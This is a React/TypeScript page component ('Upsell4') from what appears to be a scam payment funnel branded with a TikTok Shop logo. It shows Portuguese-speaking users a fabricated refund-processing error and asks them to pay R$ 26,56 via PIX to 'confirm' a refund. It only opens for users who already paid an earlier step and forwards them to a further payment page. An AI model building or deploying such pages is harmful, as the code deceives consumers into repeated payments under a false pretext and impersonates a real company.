import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { XCircle, Info } from "lucide-react";
import { trackPageView, trackViewContent } from "@/lib/tiktokPixel";
import tiktokLogo from "@/assets/tiktok-shop.png";
import PixModal from "@/components/PixModal";

const PINK = "#ff3870";
const AMOUNT = 26.56;

interface CustomerData {
  name: string;
  email: string;
  cpf: string;
  phone: string;
}

const Upsell4 = () => {
  const navigate = useNavigate();
  const [showPixModal, setShowPixModal] = useState(false);
  const [customerData, setCustomerData] = useState<CustomerData>({
    name: 'Cliente',
    email: 'cliente@email.com',
    cpf: '00000000000',
    phone: '00000000000',
  });

  // Track page view
  useEffect(() => {
    trackPageView();
    trackViewContent('upsell4', 'Confirmação de Reembolso', AMOUNT);
  }, []);

  // Verifica se o usuário pagou o up3
  useEffect(() => {
    const up3Paid = localStorage.getItem('up3PaymentApproved');
    if (!up3Paid) {
      navigate('/checkout', { replace: true });
    }
  }, [navigate]);

  useEffect(() => {
    const stored = localStorage.getItem('customerData');
    if (stored) {
      try {
        const data = JSON.parse(stored);
        setCustomerData(data);
      } catch {
        // Mantém dados default
      }
    }
  }, []);

  const handleSuccess = () => {
    setShowPixModal(false);
    localStorage.setItem('up4PaymentApproved', 'true');
    navigate('/up5');
  };

  return (
    <div className="min-h-screen bg-secondary/30 flex flex-col">
      {/* Header TikTok */}
      <div className="bg-card py-4 border-b border-border">
        <img 
          src={tiktokLogo} 
          alt="TikTok" 
          className="h-8 mx-auto"
        />
      </div>

      <div className="flex-1 p-4 space-y-4 max-w-md mx-auto w-full">
        {/* Card Erro */}
        <div className="bg-card rounded-2xl p-6 shadow-card border-2 border-rose-400">
          <div className="bg-rose-100 rounded-xl p-6 text-center">
            <div className="w-16 h-16 rounded-full bg-rose-500 flex items-center justify-center mx-auto mb-4">
              <XCircle className="w-10 h-10 text-white" />
            </div>
            <h1 className="text-xl font-bold text-rose-500 mb-3">
              Erro no Processamento
            </h1>
            <p className="text-muted-foreground text-sm leading-relaxed">
              Identificamos uma falha no processamento do seu reembolso. Seu pagamento será reembolsado integralmente assim que confirmado.
            </p>
          </div>
        </div>

        {/* Card Processo de Reembolso */}
        <div className="bg-card rounded-2xl p-6 shadow-card border-l-4 border-rose-400">
          <div className="flex items-center gap-2 mb-4">
            <Info className="w-5 h-5 text-rose-500" />
            <h2 className="text-lg font-bold text-foreground">Processo de Reembolso</h2>
          </div>
          <ul className="space-y-3 text-muted-foreground text-sm">
            <li className="flex items-start gap-2">
              <span className="w-1.5 h-1.5 rounded-full bg-muted-foreground mt-2 flex-shrink-0"></span>
              <span>O valor será reembolsado automaticamente após a confirmação do pagamento</span>
            </li>
            <li className="flex items-start gap-2">
              <span className="w-1.5 h-1.5 rounded-full bg-muted-foreground mt-2 flex-shrink-0"></span>
              <span>O reembolso será processado na mesma forma de pagamento utilizada</span>
            </li>
            <li className="flex items-start gap-2">
              <span className="w-1.5 h-1.5 rounded-full bg-muted-foreground mt-2 flex-shrink-0"></span>
              <span>O prazo para compensação pode variar de acordo com sua instituição financeira</span>
            </li>
          </ul>
        </div>

        {/* Card Valor */}
        <div className="bg-card rounded-2xl p-6 shadow-card text-center">
          <p className="text-muted-foreground text-sm uppercase tracking-wide mb-2">
            VALOR A SER REEMBOLSADO
          </p>
          <p className="text-4xl font-extrabold text-rose-500 mb-3">
            R$ {AMOUNT.toFixed(2).replace('.', ',')}
          </p>
          <p className="text-muted-foreground text-sm">
            Clique abaixo para confirmar o pagamento e iniciar o processo de reembolso
          </p>
        </div>

        {/* Botão */}
        <button
          onClick={() => setShowPixModal(true)}
          className="w-full font-bold py-4 px-6 rounded-xl text-base transition-colors shadow-lg uppercase tracking-wide text-white"
          style={{ backgroundColor: PINK }}
        >
          CONFIRMAR PAGAMENTO
        </button>
      </div>

      {/* PIX Modal */}
      <PixModal
        isOpen={showPixModal}
        onClose={() => setShowPixModal(false)}
        amount={AMOUNT}
        title="Confirmação de Reembolso"
        customerName={customerData.name}
        customerEmail={customerData.email}
        customerCpf={customerData.cpf}
        customerPhone={customerData.phone}
        details="Confirmação de Reembolso"
        onSuccess={handleSuccess}
      />
    </div>
  );
};

export default Upsell4;
